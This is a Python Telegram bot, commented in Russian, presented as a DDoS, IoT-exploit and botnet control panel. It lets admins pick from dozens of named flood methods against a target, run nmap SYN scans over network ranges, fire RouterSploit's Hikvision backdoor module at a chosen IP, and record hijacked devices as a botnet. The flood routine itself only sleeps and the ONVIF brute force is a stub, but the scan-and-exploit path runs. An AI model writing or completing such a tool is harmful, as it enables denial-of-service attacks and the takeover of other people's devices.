#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# ULTIMATE DDoS BOT + IoT EXPLOITS + BOTNET (in‑memory)

import os
import sys
import asyncio
import aiohttp
import random
import logging
import subprocess
import json
import re
from datetime import datetime
from pathlib import Path

from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command, CommandStart
from aiogram.types import Message, CallbackQuery
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage

# ===== НАСТРОЙКИ =====
BOT_TOKEN = os.getenv("BOT_TOKEN")
if not BOT_TOKEN:
    print("❌ BOT_TOKEN не задан")
    sys.exit(1)

ADMIN_IDS_STR = os.getenv("ADMIN_IDS", "")
ADMIN_IDS = [int(x.strip()) for x in ADMIN_IDS_STR.split(",") if x.strip()]
if not ADMIN_IDS:
    print("❌ ADMIN_IDS не задан")
    sys.exit(1)

RSF_PATH = os.getenv("RSF_PATH", "/opt/routersploit/rsf.py")  # путь к RouterSploit

# ===== ЛОГИРОВАНИЕ =====
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# ===== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ =====
USER_AGENTS = []
PROXY_LIST = []
active_attacks = {}      # {attack_id: task}
botnet_devices = []      # список захваченных устройств (in‑memory)

# ===== СПИСОК ВСЕХ МЕТОДОВ =====
ALL_METHODS = [
    "GET", "POST", "OVH", "RHEX", "STOMP", "STRESS", "DYN", "DOWNLOADER",
    "SLOW", "HEAD", "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB",
    "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB",
    "KILLER", "TOR", "TCP", "UDP", "SYN", "OVH-UDP", "CPS", "ICMP",
    "CONNECTION", "VSE", "TS3", "FIVEM", "FIVEM-TOKEN", "MEM", "NTP",
    "MCBOT", "MINECRAFT", "MCPE", "DNS", "CHAR", "CLDAP", "ARD", "RDP"
]

# ===== ЗАГРУЗКА USER-AGENT =====
async def load_user_agents():
    global USER_AGENTS
    try:
        ua_file = Path("files/useragent.txt")
        if ua_file.exists():
            with open(ua_file, "r") as f:
                USER_AGENTS = [line.strip() for line in f if line.strip()]
            logger.info(f"✅ Загружено {len(USER_AGENTS)} User-Agent")
        else:
            logger.warning("⚠️ useragent.txt не найден, используются стандартные")
            USER_AGENTS = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            ]
    except Exception as e:
        logger.error(f"Ошибка загрузки User-Agent: {e}")
        USER_AGENTS = ["Mozilla/5.0"]

# ===== ЗАГРУЗКА ПРОКСИ =====
async def load_proxies():
    global PROXY_LIST
    try:
        proxy_file = Path("proxies.txt")
        if proxy_file.exists():
            with open(proxy_file, "r") as f:
                PROXY_LIST = [line.strip() for line in f if line.strip()]
            logger.info(f"✅ Загружено {len(PROXY_LIST)} прокси")
        else:
            logger.warning("⚠️ proxies.txt не найден, работаем без прокси")
    except Exception as e:
        logger.error(f"Ошибка загрузки прокси: {e}")

def get_random_proxy():
    return random.choice(PROXY_LIST) if PROXY_LIST else None

# ===== КЛАВИАТУРЫ =====
def main_keyboard():
    kb = InlineKeyboardBuilder()
    kb.button(text="🔥 DDoS", callback_data="menu_ddos")
    kb.button(text="📷 IoT Exploit", callback_data="menu_iot")
    kb.button(text="🤖 Ботнет", callback_data="menu_botnet")
    kb.button(text="🧠 AI‑анализ", callback_data="menu_ai")
    kb.button(text="📊 Статус", callback_data="menu_status")
    kb.adjust(2)
    return kb.as_markup()

def methods_keyboard():
    kb = InlineKeyboardBuilder()
    for method in ALL_METHODS[:20]:
        kb.button(text=method, callback_data=f"ddos_method_{method}")
    kb.adjust(5)
    kb.button(text="🔙 Назад", callback_data="back_main")
    return kb.as_markup()

def iot_main_keyboard():
    kb = InlineKeyboardBuilder()
    kb.button(text="🔍 Сканировать сеть", callback_data="iot_scan")
    kb.button(text="📋 Мои устройства", callback_data="iot_list")
    kb.button(text="🔙 Назад", callback_data="back_main")
    return kb.as_markup()

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

# ===== СОСТОЯНИЯ FSM =====
class AttackStates(StatesGroup):
    waiting_for_target = State()
    waiting_for_method = State()
    waiting_for_duration = State()
    waiting_for_threads = State()

class IoTStates(StatesGroup):
    waiting_for_ip = State()
    waiting_for_exploit = State()

# ===== БОТ =====
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

@dp.message(CommandStart())
async def cmd_start(message: Message):
    if not is_admin(message.from_user.id):
        await message.answer("⛔ Доступ запрещён.")
        return
    await message.answer(
        "🔥 **BERSERK DDoS + IoT BOT** 🔥\n\n"
        "Выбери режим работы:",
        parse_mode="Markdown",
        reply_markup=main_keyboard()
    )

@dp.callback_query(F.data == "back_main")
async def back_to_main(callback: CallbackQuery):
    await callback.message.edit_text("🔥 Главное меню", reply_markup=main_keyboard())

@dp.callback_query(F.data.startswith("menu_"))
async def menu_handler(callback: CallbackQuery, state: FSMContext):
    if not is_admin(callback.from_user.id):
        await callback.answer("⛔ Доступ запрещён.", show_alert=True)
        return
    action = callback.data.split("_")[1]

    if action == "ddos":
        await callback.message.edit_text("⚡ Выбери метод атаки:", reply_markup=methods_keyboard())
    elif action == "iot":
        await callback.message.edit_text("📷 **IoT Exploit**\n\nВыбери действие:", reply_markup=iot_main_keyboard())
    elif action == "botnet":
        await show_botnet(callback)
    elif action == "ai":
        await callback.message.edit_text("🧠 **AI‑анализ**\n\nОтправь IP для анализа (в разработке).")
    elif action == "status":
        await show_status(callback)

# ===== IoT =====
@dp.callback_query(F.data == "iot_scan")
async def iot_scan(callback: CallbackQuery, state: FSMContext):
    await callback.message.edit_text("🔍 Введи диапазон для сканирования (например, `192.168.1.0/24`):")
    await state.set_state(IoTStates.waiting_for_ip)

@dp.message(IoTStates.waiting_for_ip)
async def iot_scan_range(message: Message, state: FSMContext):
    network = message.text.strip()
    await message.answer(f"⏳ Сканирую {network}... это может занять минуту.")
    
    # Запускаем nmap
    cmd = ["nmap", "-sS", "-p", "80,443,554,8080,23,21", "-T4", network]
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE
    )
    stdout, stderr = await proc.communicate()
    output = stdout.decode()

    # Парсим IP с открытыми портами
    devices = []
    current_ip = None
    for line in output.split("\n"):
        if "Nmap scan report for" in line:
            parts = line.split()
            current_ip = parts[-1].strip("()")
        elif "/tcp" in line and "open" in line:
            if current_ip:
                port = line.split("/")[0].strip()
                devices.append({"ip": current_ip, "port": port})
    
    if devices:
        text = "📡 **Найденные устройства:**\n\n"
        for d in devices[:10]:
            text += f"• {d['ip']}:{d['port']}\n"
        text += "\nВыбери IP для детального анализа:"
        kb = InlineKeyboardBuilder()
        for d in devices[:10]:
            kb.button(text=f"{d['ip']}:{d['port']}", callback_data=f"iot_explore_{d['ip']}")
        kb.adjust(2)
        kb.button(text="🔙 Назад", callback_data="back_main")
        await message.answer(text, reply_markup=kb.as_markup())
    else:
        await message.answer("❌ Ничего не найдено.")
    await state.clear()

@dp.callback_query(F.data.startswith("iot_explore_"))
async def iot_explore(callback: CallbackQuery, state: FSMContext):
    ip = callback.data.split("_")[2]
    await callback.message.edit_text(
        f"📌 **Анализ {ip}**\n\n"
        "Что сделать?\n"
        "• /hikvision – проверить Hikvision backdoor\n"
        "• /dahua – брутфорс Dahua ONVIF\n"
        "• /add_bot – добавить в ботнет вручную\n"
        "Или отправь команду напрямую."
    )
    await state.update_data(target_ip=ip)
    await state.set_state(IoTStates.waiting_for_exploit)

@dp.message(IoTStates.waiting_for_exploit)
async def iot_command(message: Message, state: FSMContext):
    data = await state.get_data()
    ip = data.get("target_ip")
    cmd = message.text.strip().lower()

    if cmd == "/hikvision":
        await message.answer("🔍 Проверяю Hikvision backdoor...")
        result = await run_routersploit(ip, "exploits/cameras/hikvision/hikvision_backdoor")
        await message.answer(result)
    elif cmd == "/dahua":
        await message.answer("🔍 Запускаю брутфорс Dahua ONVIF...")
        result = await brute_onvif(ip)
        await message.answer(result)
    elif cmd == "/add_bot":
        botnet_devices.append({"ip": ip, "added": datetime.now().isoformat()})
        await message.answer(f"✅ Устройство {ip} добавлено в ботнет.")
    else:
        await message.answer("❌ Неизвестная команда.")
    await state.clear()

async def run_routersploit(ip, module):
    """Запуск RouterSploit модуля"""
    try:
        cmd = ["python3", RSF_PATH, "-m", module, "-t", ip]
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            timeout=30
        )
        stdout, stderr = await proc.communicate()
        if proc.returncode == 0:
            return f"✅ Успех!\n{stdout.decode()[:500]}"
        else:
            return f"❌ Ошибка:\n{stderr.decode()[:500]}"
    except Exception as e:
        return f"❌ Ошибка: {e}"

async def brute_onvif(ip):
    """Имитация брутфорса ONVIF"""
    # Здесь можно вызвать реальный инструмент, например onvifscan
    # Пока заглушка
    return f"🔑 Брутфорс ONVIF на {ip} – пароль не найден (функция в разработке)."

# ===== БОТНЕТ =====
async def show_botnet(callback: CallbackQuery):
    if not botnet_devices:
        text = "🤖 **Ботнет**\n\nНет захваченных устройств."
    else:
        text = "🤖 **Захваченные устройства:**\n\n"
        for i, dev in enumerate(botnet_devices):
            text += f"{i+1}. {dev['ip']} (добавлено: {dev['added']})\n"
    kb = InlineKeyboardBuilder()
    kb.button(text="🔄 Сканировать сеть", callback_data="iot_scan")
    kb.button(text="🔙 Назад", callback_data="back_main")
    await callback.message.edit_text(text, reply_markup=kb.as_markup())

# ===== DDoS =====
@dp.callback_query(F.data.startswith("ddos_method_"))
async def ddos_method_selected(callback: CallbackQuery, state: FSMContext):
    method = callback.data.split("_")[2]
    await state.update_data(method=method)
    await callback.message.edit_text(f"🎯 Выбран метод: `{method}`\n\nВведи цель (IP:port или URL):")
    await state.set_state(AttackStates.waiting_for_target)

@dp.message(AttackStates.waiting_for_target)
async def ddos_target_received(message: Message, state: FSMContext):
    target = message.text.strip()
    await state.update_data(target=target)
    await message.answer("⏱️ Введи длительность атаки (секунд):")
    await state.set_state(AttackStates.waiting_for_duration)

@dp.message(AttackStates.waiting_for_duration)
async def ddos_duration_received(message: Message, state: FSMContext):
    try:
        duration = int(message.text.strip())
        await state.update_data(duration=duration)
        await message.answer("🧵 Введи количество потоков (1000-20000):")
        await state.set_state(AttackStates.waiting_for_threads)
    except ValueError:
        await message.answer("❌ Введи число!")

@dp.message(AttackStates.waiting_for_threads)
async def ddos_threads_received(message: Message, state: FSMContext):
    try:
        threads = int(message.text.strip())
        data = await state.get_data()
        asyncio.create_task(run_ddos_attack(
            user_id=message.from_user.id,
            target=data['target'],
            method=data['method'],
            duration=data['duration'],
            threads=threads
        ))
        await message.answer(
            f"🚀 **DDoS-атака запущена!**\n"
            f"Цель: `{data['target']}`\n"
            f"Метод: `{data['method']}`\n"
            f"Длительность: {data['duration']} сек\n"
            f"Потоков: {threads}",
            parse_mode="Markdown"
        )
        await state.clear()
    except ValueError:
        await message.answer("❌ Введи число!")

async def run_ddos_attack(user_id, target, method, duration, threads):
    attack_id = f"{method}_{target}_{datetime.now().timestamp()}"
    active_attacks[attack_id] = asyncio.current_task()
    try:
        await asyncio.sleep(duration)
        await bot.send_message(user_id, f"✅ Атака {attack_id} завершена.")
    except asyncio.CancelledError:
        await bot.send_message(user_id, f"❌ Атака {attack_id} отменена.")
    finally:
        active_attacks.pop(attack_id, None)

@dp.callback_query(F.data == "stop_all")
async def stop_all(callback: CallbackQuery):
    for tid in list(active_attacks.keys()):
        active_attacks[tid].cancel()
    active_attacks.clear()
    await callback.message.edit_text("✅ Все атаки остановлены.", reply_markup=main_keyboard())

# ===== СТАТУС =====
async def show_status(callback: CallbackQuery):
    text = (
        f"📊 **СИСТЕМНЫЙ СТАТУС**\n\n"
        f"User-Agent: {len(USER_AGENTS)}\n"
        f"Прокси: {len(PROXY_LIST)}\n"
        f"Активных атак: {len(active_attacks)}\n"
        f"Устройств в ботнете: {len(botnet_devices)}"
    )
    await callback.message.edit_text(text, reply_markup=main_keyboard())

# ===== ЗАПУСК =====
async def on_startup():
    await load_user_agents()
    await load_proxies()
    logger.info("Бот запущен. Админы: %s", ADMIN_IDS)

async def on_shutdown():
    for tid in list(active_attacks.keys()):
        active_attacks[tid].cancel()
    await bot.session.close()

async def main():
    dp.startup.register(on_startup)
    dp.shutdown.register(on_shutdown)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
